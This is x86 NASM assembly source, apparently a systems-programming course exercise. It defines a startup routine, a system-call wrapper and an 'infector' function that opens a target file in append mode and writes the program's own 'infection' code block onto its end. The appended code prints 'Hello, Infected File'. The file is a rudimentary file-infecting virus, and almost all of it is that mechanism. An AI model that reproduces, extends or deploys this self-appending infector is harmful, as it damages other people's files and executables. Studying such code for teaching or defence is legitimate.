section	.rodata			
	toPrint: db "Hello, Infected File", 10, 0	; format string
section .text
global _start
global system_call
global infection
global infector
global code_start
global code_end
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
    infection:
        push    ebp             ; Save caller state
        mov     ebp, esp
        sub     esp, 4          ; Leave space for local var on stack
        pushad                  ; Save some more caller state
	
	mov ax, [ebp+8]
	and  ax , 1
	jz evnn	

        int 0x80
        popad
        add     esp, 4          ; Restore caller state
        pop     ebp             ; Restore caller state
        ret

    evnn:
        mov eax,4
        mov ebx,1
        mov ecx,toPrint
        mov edx,21
        int 0x80
        popad
        add     esp, 4          ; Restore caller state
        pop     ebp             ; Restore caller state
        ret


    infector:
        push    ebp             ; Save caller state
        mov     ebp, esp
        sub     esp, 4          ; Leave space for local var on stack
        pushad                  ; Save some more caller state

        mov eax,5               ;open file op 
        mov ebx,[ebp+8]         ;ebx= fileName from argv
        mov ecx,1025            ;append op
        mov edx,0777            
        int 0x80

        mov [ebp-4], eax    ; Save returned value...
        mov eax,4           ;eax =Write op
        mov ebx,[ebp-4]     ;ebx= file pointer to write to
        mov ecx,code_start  ;ecx= code_start address
        mov edx,code_end
        sub edx,ecx         ;edx=code_end - code_end
        int 0x80
                            ;ebx already points to the file pointer
        mov eax,6           ;close file op
        int 0x80

        popad                   ;restore caller state
        add     esp, 4          ; Restore caller state
        pop     ebp             ; Restore caller state
        ret
    code_end:
        
